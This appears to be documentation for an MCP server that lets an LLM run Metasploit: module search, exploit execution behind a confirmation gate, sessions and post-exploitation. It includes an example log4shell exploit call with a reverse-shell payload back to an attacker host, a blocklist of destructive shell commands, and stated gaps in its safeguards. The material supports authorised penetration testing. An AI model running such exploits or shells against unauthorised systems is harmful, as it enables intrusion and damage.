# Metasploit Integration

Raven Nest MCP provides six MCP tools that connect to a running Metasploit Framework `msfrpcd` instance via MessagePack RPC over HTTPS. This integration enables module search, exploit execution with a confirmation gate, auxiliary scanning, session management, and post-exploitation -- all through the same MCP interface used by the other pentesting tools.

The integration is **disabled by default**. The operator must explicitly enable it, start `msfrpcd` separately, and configure the connection credentials.

## Prerequisites

- **Metasploit Framework** installed (package manager, official installer, or Docker)
- **msfrpcd** available in `$PATH` (ships with Metasploit)
- **RAM:** ~1 GB for the msfrpcd process (Ruby-based, no GPU required)
- A running Raven Nest MCP server (`raven-server`)

## Quick Start

1. Start msfrpcd:

```sh
msfrpcd -P your-password -a 127.0.0.1 -p 55553 -n -f
```

Flags: `-P` password, `-a` bind address, `-p` port, `-n` disable database, `-f` foreground.

2. Enable Metasploit in `config/default.toml`:

```toml
[metasploit]
enabled = true
password = "your-password"
```

3. Restart `raven-server`. The six `msf_*` tools will appear in the tool list.

## Configuration Reference

All fields live under the `[metasploit]` section of `config/default.toml`. The entire section is commented out by default.

| Field | Type | Default | Description |
|---|---|---|---|
| `enabled` | bool | `false` | Master switch. MSF tools are only registered when `true`. |
| `host` | string | `"127.0.0.1"` | msfrpcd bind address. |
| `port` | u16 | `55553` | msfrpcd port. |
| `username` | string | `"msf"` | RPC username. |
| `password` | string | `"changeme"` | RPC password. **Change this.** |
| `ssl` | bool | `true` | Use HTTPS for the RPC connection (msfrpcd default). |
| `max_search_results` | usize | `20` | Maximum modules returned by `msf_search`. |
| `max_concurrent_exploits` | usize | `1` | Maximum simultaneous exploit executions. |
| `blocked_modules` | string[] | `[]` | Substring patterns -- any module whose path contains a match is blocked. |
| `require_confirmation` | bool | `true` | Require double-call confirmation before exploit execution. |

### Example: Restrictive Setup

```toml
[metasploit]
enabled = true
host = "127.0.0.1"
port = 55553
username = "msf"
password = "strong-random-password"
ssl = true
max_search_results = 10
max_concurrent_exploits = 1
require_confirmation = true
blocked_modules = ["payload/", "eternalblue", "doublepulsar"]
```

## Workflow

The six tools are designed to be used in sequence:

```
msf_search  -->  msf_module_info  -->  msf_exploit / msf_auxiliary  -->  msf_sessions  -->  msf_post
```

1. **msf_search** -- find relevant modules by keyword, CVE, platform, or type.
2. **msf_module_info** -- inspect a module's options, references, and compatible payloads before use.
3. **msf_exploit** or **msf_auxiliary** -- execute the module against a target.
4. **msf_sessions** -- list sessions created by exploits, interact with shells, or find compatible post modules.
5. **msf_post** -- run post-exploitation modules on active sessions.

## Tool Reference

### msf_search

Search the Metasploit module database by keyword, CVE, platform, or type.

| Parameter | Type | Required | Description |
|---|---|---|---|
| `query` | string | yes | Search query (e.g. `cve:2021-44228`, `type:exploit smb`) |
| `limit` | number | no | Max results (default 20) |

**Example:**

```json
{
  "query": "type:exploit http log4shell",
  "limit": 5
}
```

**Output:** Compact table with module path, rank, and short description (truncated to 70 chars per module). Shows total count and how many are displayed.

---

### msf_module_info

Get detailed information about a specific module -- description, required options, CVE references, and compatible payloads (for exploits).

| Parameter | Type | Required | Description |
|---|---|---|---|
| `module` | string | yes | Full module path (e.g. `exploit/multi/http/log4shell_header_injection`) |

The module type is inferred from the path prefix (`exploit/`, `auxiliary/`, `post/`).

**Example:**

```json
{
  "module": "exploit/multi/http/log4shell_header_injection"
}
```

**Output:** Module name, rank, description (truncated to 300 chars), CVE/EDB references (up to 5), required options with defaults, and compatible payloads (top 5, exploits only).

---

### msf_exploit

Execute an exploit module against a target. Subject to the confirmation gate (see Safety Model below).

| Parameter | Type | Required | Description |
|---|---|---|---|
| `module` | string | yes | Exploit module path (e.g. `exploit/multi/http/log4shell_header_injection`) |
| `target` | string | yes | Target host or IP |
| `port` | number | no | Target port (sets RPORT) |
| `payload` | string | no | Payload path (auto-selects if omitted) |
| `lhost` | string | no | LHOST for reverse payloads |
| `lport` | number | no | LPORT for reverse payloads (default 4444) |
| `options` | map&lt;string,string&gt; | no | Additional module options as key-value pairs |

**Example:**

```json
{
  "module": "exploit/multi/http/log4shell_header_injection",
  "target": "10.0.0.5",
  "port": 8080,
  "payload": "java/shell_reverse_tcp",
  "lhost": "10.0.0.1",
  "lport": 4444
}
```

**First call output (confirmation):**

```
CONFIRM EXPLOIT:
  Module: exploit/multi/http/log4shell_header_injection
  Target: 10.0.0.5
  Port: 8080
  Payload: java/shell_reverse_tcp
Call msf_exploit again with identical parameters to execute.
```

**Second call output (execution):**

```
Exploit launched (job 3, uuid abc123...)
Status: completed
{ ... result data ... }

Active sessions: 1
  Session 1: shell via exploit/multi/http/log4shell_header_injection
```

The handler polls for completion with exponential backoff (2s to 16s, up to 10 attempts). Result data is truncated to 2000 chars. After polling, the handler checks for any new sessions and reports them (up to 3 shown).

**Notes:**
- The `options` map cannot override `RHOSTS` -- the validated `target` parameter is always used.
- The confirmation hash covers `module`, `target`, `port`, and `payload` only. Changing `lhost`, `lport`, or `options` between calls does not trigger re-confirmation.

---

### msf_auxiliary

Run an auxiliary module (scanners, fuzzers, version detectors).

| Parameter | Type | Required | Description |
|---|---|---|---|
| `module` | string | yes | Auxiliary module path (e.g. `auxiliary/scanner/smb/smb_version`) |
| `target` | string | yes | Target host, IP, or CIDR |
| `port` | number | no | Target port (sets RPORT) |
| `options` | map&lt;string,string&gt; | no | Additional module options as key-value pairs |

**Example:**

```json
{
  "module": "auxiliary/scanner/smb/smb_version",
  "target": "10.0.0.0/24",
  "port": 445
}
```

**Output:** Module UUID, completion status, and result data (truncated to 3000 chars). Polls with exponential backoff (2s to 16s, up to 10 attempts).

**Note:** The `options` map cannot override `RHOSTS` -- the validated `target` parameter is always used.

---

### msf_sessions

Manage active Metasploit sessions -- list, interact, stop, or find compatible post-exploitation modules.

| Parameter | Type | Required | Description |
|---|---|---|---|
| `action` | string | yes | One of: `list`, `interact`, `stop`, `compatible_modules` |
| `session_id` | number | no | Session ID (required for `interact`, `stop`, and `compatible_modules`) |
| `command` | string | no | Command to run in the session (required for `interact`) |

**Actions:**

- **list** -- Show all active sessions with type, tunnel info, and platform.
- **interact** -- Write a command to a shell session, wait 2 seconds, read output (truncated to 4096 chars). Subject to the command blocklist (see Safety Model).
- **stop** -- Kill a session by ID.
- **compatible_modules** -- List post-exploitation modules compatible with a session (up to 20).

**Example (list):**

```json
{ "action": "list" }
```

```
2 active session(s):
  [1] meterpreter 10.0.0.5:54321 -> 10.0.0.1:4444 (linux)
  [2] shell 10.0.0.6:43210 -> 10.0.0.1:4445 (windows)
```

**Example (interact):**

```json
{
  "action": "interact",
  "session_id": 1,
  "command": "whoami"
}
```

---

### msf_post

Run a post-exploitation module on an active session.

| Parameter | Type | Required | Description |
|---|---|---|---|
| `module` | string | yes | Post module path (e.g. `post/multi/gather/env`) |
| `session_id` | number | yes | Session ID to run on |
| `options` | map&lt;string,string&gt; | no | Additional module options as key-value pairs |

**Example:**

```json
{
  "module": "post/multi/gather/env",
  "session_id": 1
}
```

**Output:** Module UUID, completion status, and result data (truncated to 2000 chars). Polls with exponential backoff (2s to 16s, up to 8 attempts).

## Safety Model

The Metasploit integration uses a 5-layer safety model. Each layer is independent -- all must pass for an exploit to execute.

### Layer 1: Disabled by Default

The `[metasploit]` section is commented out in the default config. Setting `enabled = false` (or omitting the section entirely) prevents MSF tools from being registered at all. Any call to an `msf_*` tool returns an error:

> Metasploit is disabled. Set [metasploit] enabled = true in config.

### Layer 2: Target Allowlist

All tools that accept a `target` parameter (`msf_exploit`, `msf_auxiliary`) pass it through `safety::validate_target()` before any RPC call. The same allowlist validation used by nmap, nuclei, and other tools applies here.

### Layer 3: Module Blocklist

The `blocked_modules` config field accepts substring patterns. Before executing any module (exploit, auxiliary, or post), the client checks the module path against every pattern using substring matching. If any pattern is found within the module path, execution is denied:

> module 'exploit/windows/smb/eternalblue' is blocked by config

Use this to block entire categories (`payload/`), specific exploits (`eternalblue`), or platforms (`windows/`).

### Layer 4: Confirmation Gate

When `require_confirmation = true` (the default), `msf_exploit` requires the caller to submit identical parameters twice before execution:

1. **First call:** The handler hashes the request (`module` + `target` + `port` + `payload`), stores it, and returns a confirmation prompt showing exactly what will be executed.
2. **Second call:** If the hash matches the pending confirmation, the exploit runs. The pending hash is then cleared.
3. **Changed parameters:** If the second call has different parameters (module, target, port, or payload), it replaces the pending hash -- execution does not proceed.

This gives the operator (or LLM supervisor) an explicit chance to review and approve. The confirmation gate only applies to `msf_exploit`, not to auxiliary or post modules.

Note: `lhost`, `lport`, and `options` are not part of the confirmation hash. Only `module`, `target`, `port`, and `payload` are hashed.

### Layer 5: Session Command Blocklist

When interacting with sessions via `msf_sessions` (`action: "interact"`), the following command prefixes are always blocked:

| Prefix | Reason |
|---|---|
| `rm ` | File deletion |
| `del ` | File deletion (Windows) |
| `format ` | Disk formatting |
| `mkfs ` | Filesystem creation |
| `dd ` | Raw disk writes |
| `shutdown` | System shutdown |
| `reboot` | System reboot |
| `halt` | System halt |
| `poweroff` | System poweroff |
| `upload ` | File upload to target |

The check is case-insensitive and matches the start of the command string.

### Customizing Safety

**Block specific modules:**

```toml
blocked_modules = ["eternalblue", "doublepulsar", "payload/windows/x64/meterpreter"]
```

**Disable the confirmation gate** (not recommended for LLM-driven use):

```toml
require_confirmation = false
```

**Limit concurrency:**

```toml
max_concurrent_exploits = 1
```

## Security Considerations

- **Network exposure:** msfrpcd should only bind to `127.0.0.1` unless you need remote access. Never expose it to untrusted networks.
- **Credential management:** The default password `changeme` must be replaced before use. The password is stored in plain text in the TOML config file -- protect file permissions accordingly.
- **Self-signed TLS:** msfrpcd generates a self-signed certificate by default. The RPC client accepts invalid certificates (`danger_accept_invalid_certs`) to work with this default. If you need strict TLS, provide a valid certificate to msfrpcd.
- **Module blocklist:** Use `blocked_modules` to prevent execution of dangerous or out-of-scope modules. Patterns are substring matches, not regex.
- **Confirmation gate:** Keep `require_confirmation = true` for any LLM-driven workflow. This prevents the model from executing exploits without operator review.
- **Session isolation:** The command blocklist prevents destructive operations in sessions, but it is not a sandbox. An attacker with shell access can bypass prefix-based filtering. Treat sessions as high-privilege access.
- **All request structs use `deny_unknown_fields`:** any parameter name not listed in the tables above is rejected with a descriptive error. This catches LLM parameter hallucination.

## Troubleshooting

### "Metasploit is disabled"

MSF tools are not registered. Add `[metasploit]` with `enabled = true` to your config and restart `raven-server`.

### Connection refused / "msfrpcd not available"

msfrpcd is not running or is bound to a different address/port. Start it:

```sh
msfrpcd -P your-password -a 127.0.0.1 -p 55553 -n -f
```

Verify it is listening:

```sh
ss -tlnp | grep 55553
```

### Invalid Authentication Token

The RPC token expired. The client automatically re-authenticates once on token errors. If this persists, restart msfrpcd -- long-running instances can accumulate stale state.

### SSL Certificate Errors

msfrpcd generates a self-signed certificate by default. The client accepts invalid certificates (`danger_accept_invalid_certs`). If you need strict TLS, provide a valid certificate to msfrpcd and set `ssl = true`.

### Module Not Found

The Metasploit module database may be outdated. Update it:

```sh
msfconsole -q -x "db_rebuild_cache; exit"
```

Or if using `msfrpcd` without a database (`-n` flag), module search relies on filesystem scanning -- ensure your MSF installation is up to date:

```sh
msfupdate
```

### Blocked Module Error

A module matched a pattern in `blocked_modules`. Check your config and remove or adjust the pattern if the module should be allowed.

### Exploit Hangs / No Result

The exploit handler polls for up to ~5 minutes (10 attempts with exponential backoff from 2s to 16s). If the exploit takes longer, check `msf_sessions` for any sessions that were created, or use `msf_auxiliary` to verify the target is reachable first.

### Auxiliary / Post Module Hangs

Auxiliary modules poll with the same backoff as exploits (10 attempts). Post modules use a shorter window (8 attempts). If a module appears to hang, the target may be unresponsive or the module may require options that were not set -- use `msf_module_info` to check required options.
